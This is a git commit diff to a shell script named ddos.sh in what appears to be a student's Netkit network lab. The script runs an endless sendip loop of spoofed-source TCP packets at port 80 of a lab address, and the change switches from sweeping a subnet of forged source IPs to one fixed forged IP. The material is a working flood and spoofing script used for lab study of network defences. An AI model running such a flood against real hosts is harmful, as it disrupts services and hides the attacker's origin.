0020c0b36d8a5d80789811204ca0fbfc241e8892
20024195 <20024195@studenti.uniupo.it>
2019-10-25 09:15:54 +0200

    netkit ddos

--- netkit/labPF/ddos.sh
+++ netkit/labPF/ddos.sh
@@ -4,12 +4,13 @@ i="0"
 j="20"
 while true
 do
-while [[ ${i} -lt 254 ]]
+#while [[ ${i} -lt 254 ]]
+#do
+while [[ ${j} -lt 99999 ]]
 do
-while [[ ${j} -lt 8080 ]]
-do
-sendip -p ipv4 -p tcp -td 80 -ts ${j} -is $1.${i} 200.1.1.7
+# sendip -p ipv4 -p tcp -td 80 -ts ${j} -is $1.${i} 200.1.1.7
+sendip -p ipv4 -p tcp -td 80 -ts ${j} -is 195.11.14.29 200.1.1.7
 i=$[$i+1]
-done
+#done
 done
 done
